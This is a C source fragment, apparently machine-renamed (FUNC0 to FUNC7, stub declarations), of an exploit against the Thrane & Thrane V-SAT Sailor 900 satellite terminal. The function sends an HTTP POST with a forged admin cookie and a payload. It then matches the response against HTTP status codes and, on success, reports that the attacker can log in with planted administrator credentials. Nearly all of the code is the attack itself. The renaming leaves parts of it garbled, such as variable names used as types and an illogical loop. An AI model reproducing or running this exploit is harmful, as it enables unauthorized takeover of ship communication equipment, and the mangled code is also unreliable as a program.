#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int ssize_t ;
typedef  int /*<<< orphan*/  BUF_SIZE_S ;
typedef  int /*<<< orphan*/  BUF_SIZE_R ;

/* Variables and functions */
 int /*<<< orphan*/  BUFFER_MAX_SIZE ; 
 int /*<<< orphan*/  BUFFER_MIN_LEN ; 
 int /*<<< orphan*/  FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (char*,...) ; 
 int FUNC2 (int,char*,int) ; 
 int /*<<< orphan*/  FUNC3 (char*,int /*<<< orphan*/ ,char*,char*,char*,char*,char*) ; 
 char* FUNC4 (char*) ; 
 char* FUNC5 (char*,char*) ; 
 int FUNC6 (int,char*,char*) ; 

ssize_t FUNC7(int sock, char *hst, char *pg, char *pss)
{
    char BUF_SIZE_S[BUFFER_MAX_SIZE + 1], BUF_SIZE_R[BUFFER_MAX_SIZE + 1];
    ssize_t n; char *l;

    FUNC3(BUF_SIZE_S, BUFFER_MIN_LEN,
             "POST %s HTTP/1.0\n\n"
             "Host: %s\r\n"
             "Content-type: application/x-www-form-urlencoded\r\n"
             "Content-length: %zu \r\n"
             "Cookie: tt_adm=694020\r\n"
             "%s \r\n\n", pg, hst, FUNC4(pss), pss);

   if(FUNC6(sock,BUF_SIZE_S, FUNC4(BUF_SIZE_S)) == -1) {
            FUNC0("Read error");
            return -1;
}
    FUNC1("\n");
    FUNC1("Sending Payload.....\n");

    FUNC1("\n\n");
    FUNC1("%s", BUF_SIZE_S, sizeof(BUF_SIZE_S));


  while ((n =FUNC2(sock,BUF_SIZE_R,sizeof(BUF_SIZE_R))) > 0){
        BUF_SIZE_R[n] = '\0';

         if(n == -1) {
            FUNC0("Read error");
            return -1;
}



   if ( FUNC5(BUF_SIZE_R, "404")) FUNC1("\n\n[x] Exploit Failed Ref. RFC 2616, 10.4.5 - False Positive HTTP ERROR [404] Host is not a V-SAT Sailor 900 terminal.\n\n\n");
   if ( FUNC5(BUF_SIZE_R, "401")) FUNC1("\n\n[x] Exploit Failed Ref. RFC 2616, 10.4.2 - HTTP Unauthorized [401] Unauthorized Access to remote host.\n\n\n");
   if ( FUNC5(BUF_SIZE_R, "500")) FUNC1("\n\n[x] Exploit Failed Ref. RFC 2616, 10.5.1 - HTTP Internal Server Error [500] Internal Server Error - The remote host couldn't recognise the request. This is not a valid SAILOR 900 terminal.\n\n\n");
   if ( FUNC5(BUF_SIZE_R, "303")) FUNC1("\n\n[x] Exploit Failed Ref. RFC 2616, 10.3.4 - HTTP See Other [303] Possible Redirect - The code received says it is temporary under a different URL. This is not a valid SAILOR 900 terminal.\n\n\n");
   if ( FUNC5(BUF_SIZE_R, "307")) FUNC1("\n\n[x] Exploit Failed Ref. RFC 2616, 10.3.8 - HTTP Temporary Redirect [307] Possible Redirect - The requested resource received indicates redirection. This is not a valid SAILOR 900 terminal.\n\n\n");
   if ( FUNC5(BUF_SIZE_R, "403")) FUNC1("\n\n[x] Exploit Failed Ref. RFC 2616, 10.4.4 - HTTP Forbidden [403] The remote server/ understood the request, but is refusing to fulfill it.\n\n\n");
   if ( FUNC5(BUF_SIZE_R, "407")) FUNC1("\n\n[x] Exploit Failed Ref. RFC 2616, 10.4.8 - HTTP Proxy Authentication Required [407] - The remote terminal requires HTTP authentication. If this is a valid SAILOR 900 terminal, it is protected with HTTP authentication.\n\n\n");
   if ( FUNC5(BUF_SIZE_R, "408")) FUNC1("\n\n[x] Exploit Failed Ref. RFC 2616, 10.4.9 - HTTP Request Time out [408] - The client did not produce a request within the time that the server was prepared to wait.\n\n\n");
   if ( FUNC5(BUF_SIZE_R, "503")) FUNC1("\n\n[x] Exploit Failed Ref. RFC 2616, 10.5.4 - HTTP Service Unavailable [503] - Connection Refused. The hostname of the terminal provided is currently unable to handle the request.\n\n\n");
   if ( FUNC5(BUF_SIZE_R, "411")) FUNC1("\n\n[x] Exploit Failed Ref. RFC 2616 - Error 411 - Length Required. This is not a valid SAILOR 900 terminal.\n\n\n");
   if ( FUNC5(BUF_SIZE_R, "400")) FUNC1("\n\n[x] Exploit Failed Ref. RFC 2616 - Error 400 - Bad Request. This is not a valid SAILOR 900 terminal. The request could not be understood by the remote server.\n\n\n");
   if ( FUNC5(BUF_SIZE_R, "301")) FUNC1("\n\n[x] Exploit Failed Ref. RFC 2616 - Error 301 - Moved Permanently. This is not a valid SAILOR 900 terminal. The request could not be understood by the remote server.\n\n\n");
   if ( FUNC5(BUF_SIZE_R, "BAD REQUEST")) FUNC1("\n\n[x] Exploit Failed. This is not a valid SAILOR 900 terminal.\n\n\n");

   if ( FUNC5(BUF_SIZE_R, "202")) {

  while ( (l=FUNC5(BUF_SIZE_R,"Thrane & Thrane")) == NULL ) FUNC1("\n\n[x] Exploit Failed. This is not a valid SAILOR 900 terminal...\n\n\n"); }

  else if (FUNC5(BUF_SIZE_R, "Thrane & Thrane") != NULL && FUNC5(BUF_SIZE_R, "302") == NULL){
   FUNC1("[x] Mission Successful  Ref. RFC 2616, 10.2.3 - HTTP Okay  [202] The remote host is a V-SAT Sailor 900. Please Login as administrator: user:admin & pass:aisatpwn2134 on %s\n\n\n", hst);
  }
}
 FUNC1("***********************************************************************\n");
 FUNC1("*Advanced Information Security Corporation, 2014 - All Rights Reserved*\n");
 FUNC1("***********************************************************************\n");
 FUNC1("* Please wait.. I will provide you with some more information below:\n");                                                                  
 FUNC1("***********************************************************************\n");
 FUNC1("\n\n\n\n");
 FUNC1("%s \n\n", BUF_SIZE_R, sizeof(BUF_SIZE_R));

  return n;

}